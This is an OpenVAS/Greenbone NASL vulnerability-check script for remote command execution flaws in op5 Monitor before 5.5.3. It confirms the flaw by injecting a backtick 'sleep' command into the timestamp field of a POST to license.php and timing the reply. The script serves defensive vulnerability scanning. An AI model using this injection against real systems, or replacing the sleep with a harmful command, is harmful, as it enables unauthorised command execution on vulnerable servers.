# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:op5:monitor";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103380");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2012-01-09 11:07:18 +0100 (Mon, 09 Jan 2012)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2012-0261", "CVE-2012-0262");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("op5 Monitor / Appliance < 5.5.3 Multiple RCE Vulnerabilities (Dec 2013)");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("gb_op5_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("op5/http/detected");

  script_tag(name:"summary", value:"op5 Monitor / Appliance is prone to multiple remote command
  execution (RCE) vulnerabilities because it fails to properly validate user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit these issues to execute arbitrary
  commands within the context of the vulnerable system.");

  script_tag(name:"affected", value:"op5 Monitor / Appliance versions prior to 5.5.3.");

  script_tag(name:"solution", value:"Update to version 5.5.3 or later.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210126042309/http://www.securityfocus.com/bid/51212");
  script_xref(name:"URL", value:"https://web.archive.org/web/20120216234544/http://www.op5.com/news/support-news/fixed-vulnerabilities-op5-monitor-op5-appliance/");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

filename = dir + "/license.php";

sleep = make_list(3, 5, 10);

host = http_host_name(port:port);

foreach i(sleep) {

  ex = string("timestamp=1317050333`sleep ", i ,"`&action=install&install=Install");

  req = string("POST ", filename, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Accept-Encoding: identity\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(ex),
               "\r\n\r\n",
               ex);

  start = unixtime();
  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  stop = unixtime();

  if((stop - start) < i || (stop - start) > (i + 5))
    exit(99);
}

report = http_report_vuln_url(port:port, url:filename);
security_message(port: port, data: report);
exit(0);
